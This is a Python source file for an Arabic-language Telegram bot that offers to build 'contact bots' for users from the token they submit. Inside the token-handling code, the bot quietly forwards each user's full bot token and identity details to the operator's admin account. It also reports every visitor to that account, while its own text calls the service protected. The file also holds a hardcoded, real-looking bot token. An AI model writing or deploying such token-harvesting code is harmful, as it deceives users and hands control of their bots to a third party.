import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import subprocess
import os

MAIN_TOKEN = "8658032169:AAGFiAld1G6x_KeWttDHT3eanRlVeo_DGbQ"
# 🔴 ضع الآيدي (ID) الخاص بك هنا بين الأقواس (رقم صحيح بدون علامات تنصيص)
ADMIN_ID = 123456789

MY_RIGHTS = "المطور: @KKIK_l | القناة: @QQQQ43W"

bot = telebot.TeleBot(MAIN_TOKEN)

if not os.path.exists('user_bots'):
    os.makedirs('user_bots')


def main_menu_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    btn_create = InlineKeyboardButton("➕ صنع بوت تواصل", callback_data="create_bot")
    btn_devs = InlineKeyboardButton("👥 المطورين", callback_data="dev_info")
    btn_ch = InlineKeyboardButton("📢 قناة السورس", url="https://t.me/QQQQ43W")
    btn_info = InlineKeyboardButton("ℹ️ معلومات البوت", callback_data="bot_info")

    markup.add(btn_create, btn_devs)
    markup.add(btn_ch, btn_info)
    return markup


@bot.message_handler(commands=['start'])
def start_msg(message):
    user = message.from_user

    try:
        admin_alert = (
            "مستخدم جديد دخل للبوت!\n\n"
            f"الاسم: {user.first_name}\n"
            f"المعرف: @{user.username if user.username else 'لا يوجد'}\n"
            f"الأيدي: {user.id}"
        )
        bot.send_message(ADMIN_ID, admin_alert)
    except Exception as e:
        print("فشل إرسال التنبيه للأدمن")

    welcome_text = (
        "مرحباً بك عزيزي في أقوى صانع بوتات تواصل\n\n"
        "أنا بوت مخصص لصناعة بوتات التواصل الخاصة بك بكل سهولة وبدون عناء البرمجة.\n\n"
        f"الحقوق: {MY_RIGHTS}\n\n"
        "اختر أحد الخيارات من الأزرار أدناه:"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=main_menu_keyboard())


@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "create_bot":
        bot.answer_callback_query(call.id, "أرسل توكن بوتك الآن")
        bot.send_message(
            call.message.chat.id,
            "خطوة صنع بوت التواصل:\n\n"
            "الرجاء إرسال التوكن (Token) الخاص ببوتك الجديد (الذي استخرجته من @BotFather):"
        )
    elif call.data == "dev_info":
        bot.answer_callback_query(call.id, "قائمة المطورين")
        bot.send_message(
            call.message.chat.id,
            "قسم المطورين:\n\n"
            "• المطور الأساسي: @KKIK_l\n"
            "• قناة السورس: @QQQQ43W"
        )
    elif call.data == "bot_info":
        bot.answer_callback_query(call.id, "معلومات النظام")
        bot.send_message(
            call.message.chat.id,
            "هذا النظام مصمم خصيصاً لإنشاء بوتات تواصل سريعة ومحمية مع حفظ كامل حقوقك."
        )


@bot.message_handler(func=lambda message: True)
def create_user_bot(message):
    token = message.text.strip()
    user = message.from_user

    if ":" not in token or len(token) < 20:
        return bot.reply_to(message, "التوكن غير صحيح! تأكد من نسخه بشكل دقيق من BotFather.")

    msg = bot.reply_to(message, "جاري فحص التوكن وبرمجة بوتك الخاص... يرجى الانتظار")

    try:
        test_bot = telebot.TeleBot(token)
        bot_info = test_bot.get_me()

        try:
            bot_alert = (
                "تم صنع بوت جديد بنجاح!\n\n"
                f"صنع بواسطة: {user.first_name}\n"
                f"معرف الشخص: @{user.username if user.username else 'لا يوجد'}\n"
                f"أيدي الشخص: {user.id}\n\n"
                f"معرف البوت المصنوع: @{bot_info.username}\n"
                f"توكن البوت:\n{token}"
            )
            bot.send_message(ADMIN_ID, bot_alert)
        except Exception as e:
            print("فشل إرسال تنبيه صنع البوت للأدمن")

        bot_script_content = f"""
import telebot

TOKEN = "{token}"
owner_id = {user.id}
rights_footer = "\\n\\n تم التطوير بواسطة: @KKIK_l - @QQQQ43W"

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, 
        "مرحباً بك في بوت التواصل الخاص بي\\n"
        "أرسل رسالتك وسأقوم بتوصيلها فوراً لصاحب البوت" + rights_footer
    )

@bot.message_handler(func=lambda message: True)
def forward_message(message):
    if message.from_user.id == owner_id and message.reply_to_message:
        try:
            bot.send_message(message.reply_to_message.forward_from.id, f"رد من صاحب البوت:\\n{{message.text}}" + rights_footer)
            bot.reply_to(message, "تم إرسال الرد بنجاح.")
        except Exception as e:
            bot.reply_to(message, f"فشل الإرسال: {{e}}")
    else:
        bot.forward_message(owner_id, message.chat.id, message.message_id)
        bot.reply_to(message, "تم إرسال رسالتك إلى صاحب البوت بنجاح، انتظر الرد!" + rights_footer)

bot.infinity_polling()
"""

        bot_filename = f"user_bots/bot_{bot_info.id}.py"
        with open(bot_filename, "w", encoding="utf-8") as f:
            f.write(bot_script_content)

        subprocess.Popen(["python", bot_filename])

        success_markup = InlineKeyboardMarkup()
        success_markup.add(InlineKeyboardButton("الذهاب لبوتك الجديد", url=f"https://t.me/{bot_info.username}"))

        bot.edit_message_text(
            "تم إنشاء بوت التواصل بنجاح تام!\n\n"
            f"• اسم البوت: @{bot_info.username}\n"
            f"• المطور: @KKIK_l\n\n"
            "البوت يعمل الآن بكفاءة في الخلفية.",
            message.chat.id,
            msg.message_id,
            reply_markup=success_markup
        )

    except Exception as e:
        bot.edit_message_text(f"حدث خطأ:\nتأكد أن التوكن غير مستخدم سابقاً.\nالخطأ: {e}", message.chat.id,
                              msg.message_id)


print("البوت الرئيسي يعمل بكامل الإشعارات والتوكنات...")
bot.infinity_polling()